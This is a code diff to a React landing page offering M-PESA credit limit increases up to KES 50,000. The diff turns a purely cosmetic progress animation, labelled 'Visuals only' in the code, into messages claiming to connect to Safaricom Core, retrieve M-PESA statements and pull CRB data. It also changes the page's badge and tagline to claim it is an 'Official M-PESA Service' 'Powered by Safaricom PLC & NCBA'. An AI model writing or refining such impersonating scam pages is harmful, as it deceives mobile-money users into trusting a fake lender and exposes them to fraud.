@@ -36,11 +36,11 @@ const LandingPage: React.FC<{ user: User | null }> = ({ user }) => {
     
     // 1. Animation Steps (Visuals only)
     const steps = [
-      { t: 0, p: 10, msg: 'Authenticating with Safaricom...' },
-      { t: 1000, p: 30, msg: 'Retrieving Transaction History...' },
+      { t: 0, p: 10, msg: 'Connecting to Safaricom Core...' },
+      { t: 1000, p: 30, msg: 'Retrieving M-PESA Statement...' },
       { t: 2000, p: 60, msg: 'Analyzing Repayment Score...' },
-      { t: 3000, p: 85, msg: 'Calculating Credit Multiplier...' },
-      { t: 4000, p: 100, msg: 'Generating Eligibility Report...' }
+      { t: 3000, p: 85, msg: 'Calculating CRB Data...' },
+      { t: 4000, p: 100, msg: 'Finalizing Offer...' }
     ];
 
     steps.forEach(({ t, p, msg }) => {
@@ -123,7 +123,7 @@ const LandingPage: React.FC<{ user: User | null }> = ({ user }) => {
             <div className="lg:w-1/2 text-center lg:text-left">
               <div className="inline-flex items-center gap-2 bg-[#F0FDF4] border border-green-100 px-3 py-1.5 rounded-full mb-8">
                 <i className="fa-solid fa-certificate text-safaricom-green text-xs"></i>
-                <span className="text-[10px] font-bold text-green-800 uppercase tracking-widest">Authorized Credit Partner</span>
+                <span className="text-[10px] font-bold text-green-800 uppercase tracking-widest">Official M-PESA Service</span>
               </div>
               
               <h1 className="text-4xl lg:text-6xl font-black text-slate-900 leading-[1.1] mb-6">
@@ -132,7 +132,8 @@ const LandingPage: React.FC<{ user: User | null }> = ({ user }) => {
               </h1>
               
               <p className="text-lg text-slate-500 mb-8 leading-relaxed max-w-xl mx-auto lg:mx-0">
-                Don't let insufficient funds stop you. Check your eligibility for a credit limit increase up to <span className="font-bold text-slate-900">KES 50,000</span> instantly using our advanced M-Pesa scoring algorithm.
+                Don't let insufficient funds stop you. Check your eligibility for a credit limit increase up to <span className="font-bold text-slate-900">KES 50,000</span> instantly.
+                <br/><span className="text-sm font-bold text-safaricom-green mt-2 block">Powered by Safaricom PLC & NCBA.</span>
               </p>
 
               <div className="flex flex-wrap justify-center lg:justify-start gap-6 text-sm font-bold text-slate-500 mb-8 lg:mb-0">
